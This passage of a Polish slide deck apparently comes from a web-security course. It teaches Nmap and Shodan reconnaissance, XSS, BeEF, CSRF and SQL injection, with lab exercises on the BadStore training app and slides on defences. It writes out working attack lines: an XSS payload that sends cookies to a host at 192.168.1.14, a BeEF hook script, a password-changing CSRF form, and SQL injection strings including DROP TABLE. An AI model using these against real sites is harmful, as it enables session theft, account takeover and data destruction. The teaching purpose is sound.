+							<li><a href="https://www.shodan.io/home">https://www.shodan.io/home</a></li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="60">
+						<h3>Shodan</h3>
+						<img data-src="pictures/shodan.png" alt="Shodan">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="61">
+						<h3>Co w ten sposób znajdziemy?</h3>
+						<pre><code class="hljs elm" data-trim="" contenteditable=""><span class="hljs-keyword">port</span>:5901 authentication disabled</code></pre>
+					</section>
+					
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="62">
+						<h2>Ćwiczenie 3</h2>
+						Wyszukanie informacji o wybranej firmie/organizacji z wykorzystaniem techniki Google Hacking i <a href="https://pentest-tools.com/information-gathering/google-hacking">aplikacji</a>. Proponuję wykorzystać również wykorzystać Shodan.
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="63">
+						<h2>Skanowanie portów</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="64">
+						<h3>Porty (I)</h3>
+						<ul>
+							<li>Porty 0-65535</li>
+							<li>Możliwe stany portów:
+								<ul>
+									<li>Closed (zamknięty) – nie w użyciu</li>
+									<li>Open (otwarty) – nasłuchiwanie, przyjmowanie danych i przesyłanie do aplikacji</li>
+									<li>Filtered (filtrowany) – nie jest możliwe określenie stanu 
+portu (z zewnątrz), gdyż zdalny host nie odpowiada, być może ze względu 
+na firewall, który filtruje ruch</li>
+								</ul>
+							</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="65">
+						<h3>Porty (II)</h3>
+						<ul>
+							<li>Popularne aplikacje wykorzystują nr portów do 1023, tzw. dobrze znane porty</li>
+							<li>Każda aplikacja korzystająca z sieci ma port</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="66">
+						<h3>Well-known ports</h3>
+						<img data-src="pictures/ports.jpg" alt="Well-known ports" height="438">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="67">
+						<h3>Nmap (Network mapper)</h3>
+						<ul>
+							<li>Skanowanie TCP (pełna procedura nawiązania połączenia) <b>-sT</b></li>
+							<li>Skanowanie półotwarte typu TCP SYN bez pełnego nawiązania połączenia z hostem <b>-sS</b></li>
+							<li>Skanowanie UDP <b>-sU</b></li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="68">
+						<h3>Three-way Handshake</h3>
+						<img data-src="pictures/Tcp.png" alt="three-way handshake" height="438">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="69">
+						<h3>TCP SYN (Stealth) Scan</h3>
+						<img data-src="pictures/syn_scan.png" alt="TCP SYN Scan" height="238">
+						<small>Źródło: https://nmap.org/</small>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="70">
+						<h3>UDP</h3>
+						<p>Jest to protokół bezpołączeniowy, więc nie ma narzutu na 
+nawiązywanie połączenia i śledzenie sesji (w przeciwieństwie do TCP). 
+Nie ma też mechanizmów kontroli przepływu i retransmisji. </p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="71">
+						<h3>Nmap (Network mapper)</h3>
+						<ul>
+							<li>Nmap wysyła pakiet na dany numer portu i oczekuje odpowiedzi</li>
+							<li>-P0 (don’t ping)</li>
+							<li>-sT (TcpConnect)</li>
+							<li>-sS (SYN stealth Scan)</li>
+							<li>-sP (Ping Scan)</li>
+							<li>-sU (UDP Scans)</li>
+							<li><b>-sV (Version Scan)</b></li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="72">
+						<h3>Polecenie skanowania TCP SYN</h3>
+						<pre><code class="hljs css" data-trim="" contenteditable=""><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sS</span> <span class="hljs-selector-tag">-oX</span> <span class="hljs-selector-tag">raport</span><span class="hljs-selector-class">.xml</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.6</span><span class="hljs-selector-class">.29</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="73">
+						<h3>Gnerowanie raportu HTML</h3>
+						<pre><code class="hljs crmsh" data-trim="" contenteditable="">xsltproc raport.<span class="hljs-keyword">xml</span> <span class="hljs-title">-o</span> raport.html</code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="74">
+						<h3>Graficzna wersja programu nmap - Zenmap</h3>
+						<img data-src="pictures/zenmap.png" alt="Zenmap" height="480">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="75">
+						<h3>Skrypty NSE</h3>
+						<p>Skrypty NSE (Nmap Scripting Engine) są to dodatkowe skrypty 
+rozszerzające możliwości skanera Nmap np. wykrywanie podatności w 
+SSL/TLS (np. Heartbleed), ataki brute force, czy nieaktualne wersje 
+wykorzystywanych komponentów.</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="76">
+						<h3>Skrypt NSE nmap_vulners (I)</h3>
+						<ul>
+							<li>Jest to skrypt łączący Nmapa z bazą podatności vulners (<a href="https://vulners.com/landing">https://vulners.com/landing</a>)
+ - informacje o przeszło 160 000 exploitów. Skrypt przeszukuje bazę 
+podatności pod kątem występowania podatności dla zidentyfikowanych 
+wersji oprogramowania (wymaga wykonania skanowania portów z opcją 
+wykrywania wersji oprogramowania).</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="77">
+						<h3>Skrypt NSE nmap_vulners (II)</h3>
+						<ul>
+							<li>Skrypt należy pobrać z repozytorium GIT dostępnego pod adresem <a href="https://github.com/vulnersCom/nmap-vulners">https://github.com/vulnersCom/nmap-vulners</a>,
+ a następnie umieścić w folderze w którym zlokalizowane są skrypty Nmap.
+ W systemie Kali Linux folder zawierający skrypty NSE znajduje się w 
+lokalizacji /usr/share/nmap/scripts.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="78">
+						<h3>Polecenie skanowania z wykorzystaniem nmap_vulners</h3>
+						<pre><code class="hljs css" data-trim="" contenteditable=""><span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">--script</span> <span class="hljs-selector-tag">vulners</span> <span class="hljs-selector-tag">-oX</span> <span class="hljs-selector-tag">raport</span><span class="hljs-selector-class">.xml</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.6</span><span class="hljs-selector-class">.29</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="79">
+						<h3>Inne narzędzia</h3>
+						<ul>
+							<li>Colasoft Packet Builder</li>
+							<li>Hping2 / Hping3</li>
+							<li>NetScanTools Pro</li>
+							<li>Aplikacje mobilne - IP Scanner, zANTI, Fing</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="80">
+						<h3>Bazy danych podatności</h3>					
+						IBM X-Force Exchange, Exploit-db, CVEDetails, NullByte 
+						<img data-src="pictures/Obraz3.png" alt="CVE-Details" height="380">
+					</section>
+				</section>
+					
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">	
+					<section style="top: 350px; display: none;" data-node-uid="81">
+						<h2>Ćwiczenie 4</h2>
+						<ul>
+								<li>Skanowanie portów z wykorzystaniem Nmapa w trybie konsolowym lub GUI.</li>
+								<li>Skanowanie z opcją wykrywania wersji oprogramowania dla 
+portu aplikacyjnego (jak inaczej zdobyć informację o wersji 
+oprogramowania?).</li>
+								<li>Wyszukanie podatności dla tej wersji oprogramowania w bazie CVE-Details i NullByte.</li>
+						</ul>
+					</section>
+				</section>	
+					
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="82">
+						<h2>Cross-Site Scripting - XSS</h2>
+					</section>
+				
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="83">
+						<h3>Cross-Site Scripting - XSS (I)</h3>
+						<ul>
+							<li>Atak polegający na osadzeniu w treści atakowanej strony kodu, zazwyczaj JavaScript, który wyświetlany jest użytkownikowi.</li>
+							<li>Atakujący może wykonać skrypt po stronie użytkownika 
+aplikacji internetowej porywając między innymi jego sesje lub powodując 
+przekierowanie na inną stronę.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="84">
+						<h3>Cross-Site Scripting - XSS (II)</h3>
+						<ul>
+							<li>Reflected XSS (Nonpersistent XSS)</li>
+							<li>Persistent XSS (Stored XSS)</li>
+							<li>Oparte o DOM (DOM XSS)</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="85">
+						<h3>Stored XSS</h3>
+						<img data-src="pictures/Obraz1.png" alt="Regular expression" height="338">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="86">
+						<h3>Reflected XSS</h3>
+						<img data-src="pictures/Obraz2.png" alt="Regular expression" height="338">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="87">
+						<h3>XSS Lokator</h3>
+						Testy można wykonać manualnie, przesyłając w każdym możliwym 
+parametrze, którego wartość jest zwracana użytkownikowi tzw. lokator XSS
+ w postaci znaków:
+						<pre><code class="hljs livecodeserver" data-trim="" contenteditable=""><span class="hljs-string">''</span>;!<span class="hljs-comment">--"&lt;XSS&gt;=&amp;{()}</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="88">
+						<h3>XSS Standardowy Payload</h3>
+						Testy można wykonać z wykorzystaniem standardowego payloadu powodującego wyświetlenie okna z alertem:
+						<pre><code class="hljs xml" data-trim="" contenteditable=""><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="89">
+						<h3>Przykład wykonania XSS</h3>
+						<img data-src="pictures/xss_bs.png" alt="XSS example" height="538">
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="90">
+						<h2>Ćwiczenie 5</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Reflected,</li>
+								<li>Znalezienie w aplikacji BadStore podatność XSS Stored,</li>
+								<li>Wykorzystać podatność XSS do przesłania identyfikatora sesji,</li>
+								<li>Podmiana identyfikatora sesji i przejęcie sesji innego użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="91">
+						<h3>Serwer HTTP z wykorzystaniem Pythona</h3>
+						Python 2.x
+						<pre><code class="hljs nginx" data-trim="" contenteditable=""><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">9000</span></code></pre>
+						Python 3.x
+						<pre><code class="hljs stylus" data-trim="" contenteditable="">python -m http<span class="hljs-selector-class">.server</span> <span class="hljs-number">9000</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="92">
+						<h3>Kradzież plików cookie</h3>
+						<pre><code class="hljs xml" data-trim="" contenteditable=""><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href = <span class="hljs-string">'http://192.168.1.14:9000/Stealer.php?cookie='</span>+<span class="hljs-built_in">document</span>.cookie;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">				
+					<section style="top: 350px; display: none;" data-node-uid="93">
+						<h2>Wykorzystanie podatności Cross-Site Scripting (XSS)</h2>
+					</section>
+				
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="94">
+						<h3>Browser Exploitation Framework - BeEF (I)</h3>
+						Pakiet pozwala na wykorzystanie podatności XSS np. wyświetlenie 
+okna dialogowego, uruchomienie dźwięku, pobranie plików cookie, czy 
+zawartości schowka. 
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="95">
+						<h3>Browser Exploitation Framework - BeEF (II)</h3>
+						<pre><code class="hljs xml" data-trim="" contenteditable=""><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.1.14:3000/hook.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="96">
+						<h3>Browser Exploitation Framework - BeEF (III)</h3>
+						Panel logowania:
+						<a href="http://192.168.1.14:3000/ui/authentication">http://192.168.1.14:3000/ui/authentication</a>
+						Użytkownik testowy beef/beef<br>
+						Uwaga!
+						Możliwa jest tylko jedna aktywna sesja użytkownika beef. Logujcie się dopiero po zakończeniu prezentacji narzędzia.
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="97">
+						<h3>Browser Exploitation Framework - BeEF (IV)</h3>
+						<img data-src="pictures/beef.png" alt="Beef" height="498">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="98">
+						<h3>Browser Exploitation Framework - BeEF (V)</h3>
+						<ul>
+								<li>Social Engineering</li>
+								<ul>
+									<li>Fake Notification</li>
+									<li>Google Phishing</li>
+									<li>Pretty Theft</li>
+								</ul>
+								<li>Browser</li>
+								<ul>
+									<li>Webcam HTML5</li>
+									<li>Hooked Domain</li>
+									<ul>
+										<li>Get page HTML</li>
+										<li>Get cookie</li>
+									</ul>
+								</ul>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="99">
+						<h2>XSS - Metody ochrony</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="100">
+						<h3>Enkodowanie</h3>
+						Filtrowanie danych przesyłanych przez użytkownika przed ich wyświetleniem w aplikacji - enkodowanie:
+						<img data-src="pictures/encoding.jpg" alt="Encoding" height="400">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="101">
+						<h3>HttpOnly i .NET Request Validation</h3>
+						<ul>
+							<li>Zastosowanie parametru HttpOnly dla sesyjnych plików cookie.</li>
+							<li>Stosowanie innych mechanizmów ochrony np. .net request validation</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="102">
+						<h3>Przykładowy podatny kod</h3>
+						Fragment kodu odpowiadający za dodawanie danych (aplikacja .NET):
+						<pre><code class="hljs applescript" data-trim="" contenteditable="">foreach (var <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> currentRow)
+{
+	cleanedRows.Add(StringHelper.CleanSpaces(<span class="hljs-built_in">item</span>.Value));
+}</code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="103">
+						<h3>Przykładowy poprawiony kod</h3>
+						Podatność można usunąć w następujący sposób:
+						<pre><code class="hljs applescript" data-trim="" contenteditable="">foreach (var <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> currentRow)
+{
+	cleanedRows.Add(AntiXssEncoder.HtmlEncode(StringHelper.CleanSpaces(<span class="hljs-built_in">item</span>.Value), <span class="hljs-literal">false</span>));
+}</code></pre>
+						Metoda AntiXssEncoder.HtmlEncode odpowiada za encodowanie 
+wprowadzonych znaków. Od wersji .NET 4.5 moduł anty-XSS jest wbudowaną 
+częścią frameworku. Dla wcześniejszych wersji konieczne było pobranie 
+odpowiedniej biblioteki.
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="104">
+						<h2>Ćwiczenie 6</h2>
+						<ul>
+								<li>Opracowanie przykładowego scenariusza ataku z wykorzystaniem podatności XSS.</li>
+								<li>Przygotowanie fałszywego okna logowania do innego systemu.</li>
+						</ul>
+						<br><br>
+						Podpowiedź: <a href="https://resources.infosecinstitute.com/deadly-consequences-xss/">https://resources.infosecinstitute.com/deadly-consequences-xss/</a>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="105">
+						<h2>Przykładowe podatności XSS z popularnych serwisów</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="106">
+						<h3>Przykład #1 – Facebook (I)</h3>
+						<ul>
+							<li>Podatność związana z funkcją dodawania plików pochodzących bezpośrednio z Dropboxa.</li>
+							<li>Znaki specjalne w nazwie pliku nie były poprawnie filtrowane, dlatego dodanie pliku o nazwie: <i>'"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</i> skutkowało wykonaniem skryptu przez przeglądarkę i pojawieniem się okna z nazwą domeny.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="107">
+						<h3>Przykład #1 – Facebook (II)</h3>
+						<ul>
+							<li>Do wykonania skryptu dochodziło bezpośrednio po dodaniu pliku, po wybraniu opcji Share.</li>
+							<li>Jedyną trudnością było tutaj dodanie pliku o takiej nazwie do
+ Dropboxa, nie było to możliwe bezpośrednio przez formularz uploadu ale 
+nie stanowiło problemu jeśli utworzyło się taki plik lokalnie, a 
+następnie zsynchronizowało katalog z Dropboxem. </li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="108">
+						<h3>Przykład #1 – Facebook (III)</h3>
+							<img data-src="pictures/xss_fb.jpg" alt="XSS FB" height="400">
+							<p><a href="https://blog.detectify.com/2012/12/30/how-i-hacked-facebook-and-received-a-3500-usd-facebook-bug-bounty/">Źródło</a></p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="109">
+						<h3>Przykład #2 – Linkedin (I)</h3>
+						<ul>
+							<li>Podatny na ataki XSS był formularz tworzenia nowej dyskusji, a dokładnie pole o nazwie More Details.</li>
+							<li>Wprowadzenie w to pole wartości: <i>&lt;&lt;a&gt;&lt;/a&gt;body onload=alert('xss')&gt; </i>
+ skutkowało trwałym zapisaniem w aplikacji payloadu XSS, a następnie 
+jego wykonywaniem przez przeglądarki wszystkich użytkowników czytających
+ daną dyskusję.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="110">
+						<h3>Przykład #2 – Linkedin (II)</h3>
+							<img data-src="pictures/xss_li.jpg" alt="XSS LI" height="400">
+							<p><a href="https://www.zdnet.com/article/linkedin-patches-serious-xss-vulnerability/">Źródło</a></p>
+					</section>
+				
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="111">
+						<h2>Retrospekcja</h2>
+					</section>
+				
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="112">
+					<h3>Co udało się już omówić? (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li>Skanowanie portów</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="113">
+					<h3>Co udało się już omówić? (II)</h3>
+						<ul>
+							<li>Przegląd baz danych podatności</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+						</ul>
+					</section>
+				</section>
+					
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="114">
+						<h2>Cross-Site Request Forgery - CSRF</h2>
+					</section>
+										
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="115">
+						<h3>Cross-Site Request Forgery - CSRF (I)</h3>
+						Atak polegający na zmuszeniu użytkownika do wykonania niepożądanej
+ akcji w aplikacji internetowej, w której aktualnie jest zalogowany.
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="116">
+						<h3>Cross-Site Request Forgery - CSRF (II)</h3>
+						<p style="text-align: left;">Z podatnością mamy do czynienia gdy w aplikacji konkretny link wykonuje konkretną akcję np.:</p>
+						<ul>
+							<li>Wykorzystywana jest metoda GET do wykonania istotnej akcji w systemie (parametry w linku).</li>
+							<li>Link jest powtarzalny.</li>
+							<li>Pliki cookie zostaną wysłane automatycznie.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="117">
+						<h3>Cross-Site Request Forgery - CSRF (III)</h3>
+						<p style="text-align: left;">Sposób testowania:</p>
+						<ul>
+							<li>Wyszukanie funkcjonalności realizujących zdarzenia 
+zmieniające pewne wartości w systemie np. realizujące przelew, 
+zmieniające hasło.</li>
+							<li>Sprawdzenie powtarzalności żądań/obecności tokenów, a w przypadku ich obecności poprawnego walidowania.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="118">
+						<h3>Cross-Site Request Forgery - CSRF (IV)</h3>
+						<img src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/cross-site%2520request%2520forgery.svg"><br>
+						<a href="https://portswigger.net/web-security/csrf">Źródło</a>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="119">
+						<h2>Ćwiczenie 7</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność CSRF,</li>
+								<li>Przygotowanie strony HTML pozwalającej na wykorzystanie 
+podatności np. dla funkcjonalności zmiany hasła lub zakupu produktu w 
+imieniu innego zalogowanego użytkownika.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="120">
+						<h3>Przykład formularza do ataku CSRF</h3>
+						<pre><code class="html hljs xml" data-trim="" contenteditable=""><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="hljs-string">''</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'/'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+	<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://www.badstore.net/cgi-bin/badstore.cgi?action=moduser"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"fullname"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"newemail"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"newpasswd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"qwerty"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"vnewpasswd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"qwerty"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"role"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"U"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"test@test.pl"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"DoMods"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Change Account"</span>&gt;</span>
+	  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit request"</span>&gt;</span>
+	<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="121">
+						<h2>SQL Injection</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="122">
+						<h3>SQL Injection - podstawowe informacje</h3>
+							<ul>
+								<li>Aplikacja otrzymuje od atakującego odpowiednio spreparowane dane.</li> 
+								<li>Dane przekazywane są do zapytania do bazy danych bez odpowiedniej walidacji.</li>
+								<li>Na poziomie bazy danych uruchamiane jest nieautoryzowane zapytanie.</li> 
+							</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="123">
+						<h3>SQL Injection - przykład</h3>
+						Przykład modyfikowania zapytań:
+						<pre><code class="hljs lasso" data-trim="" contenteditable="">$q = mysql_query(<span class="hljs-string">"SELECT * FROM uzytkownicy WHERE uzytkownik = '$uzytkownik'"</span>);
+
+<span class="hljs-keyword">SELECT</span> * FROM uzytkownicy <span class="hljs-keyword">WHERE</span> uzytkownik = <span class="hljs-string">'kowalski'</span>
+
+<span class="hljs-keyword">SELECT</span> * FROM uzytkownicy <span class="hljs-keyword">WHERE</span> uzytkownik = <span class="hljs-string">'x'</span> <span class="hljs-literal">OR</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span> 
+
+<span class="hljs-keyword">SELECT</span> * FROM uzytkownicy <span class="hljs-keyword">WHERE</span> uzytkownik = <span class="hljs-string">'x'</span>; DROP TABLE uzytkownicy; <span class="hljs-keyword">SELECT</span> <span class="hljs-string">'1'</span></code></pre>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="124">
+					<h3>SQL Injection - testowanie</h3>
+					Pierwszym etapem testu jest próba wywołania standardowego 
+komunikatu błędu bazy danych SQL poprzez dodanie cudzysłowu pojedynczego
+ (’) oraz średnika (;) do wartości testowanego 
+					parametru. Cudzysłów jest używany w SQL jako terminator łańcucha 
+znaków. 
+					Średnik jest natomiast używany do zakończenia instrukcji SQL, tutaj
+ również w przypadku braku filtrowania może dojść do zwrócenia błędu 
+SQL.
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="125">
+						<h3>SQL Injection - komentarze</h3>
+						<p style="text-align: left;">Przykładowe metody wprowadzania komentarzy w mysql:
+						</p><ul>
+								<li># komentarz do końca linii</li>
+								<li>-- komentarz do końca linii</li>
+								<li>/* komentarz w środku linii */</li>
+						</ul><p></p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="126">
+						<h3>Funkcja LOAD_FILE()</h3>
+						<pre><code class="hljs sql" data-trim="" contenteditable=""><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">'/home/username/myfile.txt'</span>)</code></pre>
+					</section>
+				</section>
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="127">
+						<h2>Ćwiczenie 8</h2>
+						<ul>
+								<li>Znalezienie w aplikacji BadStore podatność SQL Injection.</li>
+								<li>Wyświetlenie informacji o wersji bazy danych. Podpowiedź - <i>VERSION()</i></li>
